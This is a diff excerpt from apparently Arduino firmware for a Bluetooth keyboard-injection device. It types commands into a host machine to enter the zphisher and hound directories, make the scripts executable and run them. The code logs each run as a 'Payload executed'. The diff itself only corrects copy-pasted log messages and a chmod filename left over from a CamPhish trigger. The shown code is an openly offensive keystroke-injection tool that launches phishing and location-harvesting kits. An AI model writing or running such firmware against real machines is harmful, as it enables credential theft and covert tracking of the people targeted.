@@ -437,15 +437,15 @@ void loop() {
       sendString("cd zphisher", 50); delay(1000); // 50ms per char, 1000ms before RETURN
       bleKeyboard.press(KEY_RETURN); delay(500); 
       bleKeyboard.releaseAll(); delay(1000); // Kept for quick cd
-      Serial.println("Changed to CamPhish directory");
-      sendString("chmod +x camphish.sh", 50); delay(1000); // 50ms per char, 1000ms before RETURN
+      Serial.println("Changed to Zphisher directory");
+      sendString("chmod +x zphisher.sh", 50); delay(1000); // 50ms per char, 1000ms before RETURN
       bleKeyboard.press(KEY_RETURN); delay(500); 
       bleKeyboard.releaseAll(); delay(1000); // Quick chmod
       Serial.println("Set executable permissions");
       sendString("bash zphisher.sh", 50); delay(1000); // 50ms per char, 1000ms before RETURN
       bleKeyboard.press(KEY_RETURN); delay(500); 
       bleKeyboard.releaseAll(); delay(10000); // Increased for script startup
-      Serial.println("CamPhish Payload executed");
+      Serial.println("Zphisher Payload executed");
     }
 
     // Trigger 15: Clone and run hound script
@@ -464,7 +464,7 @@ void loop() {
       sendString("cd hound", 50); delay(1000); // 50ms per char, 1000ms before RETURN
       bleKeyboard.press(KEY_RETURN); delay(500); 
       bleKeyboard.releaseAll(); delay(1000); // Kept for quick cd
-      Serial.println("Changed to CamPhish directory");
+      Serial.println("Changed to Hound directory");
       sendString("chmod +x hound.sh", 50); delay(1000); // 50ms per char, 1000ms before RETURN
       bleKeyboard.press(KEY_RETURN); delay(500); 
       bleKeyboard.releaseAll(); delay(1000); // Quick chmod
@@ -472,7 +472,7 @@ void loop() {
       sendString("bash hound.sh", 50); delay(1000); // 50ms per char, 1000ms before RETURN
       bleKeyboard.press(KEY_RETURN); delay(500); 
       bleKeyboard.releaseAll(); delay(10000); // Increased for script startup
-      Serial.println("CamPhish Payload executed");
+      Serial.println("Hound Payload executed");
     }
 
     // Update last states
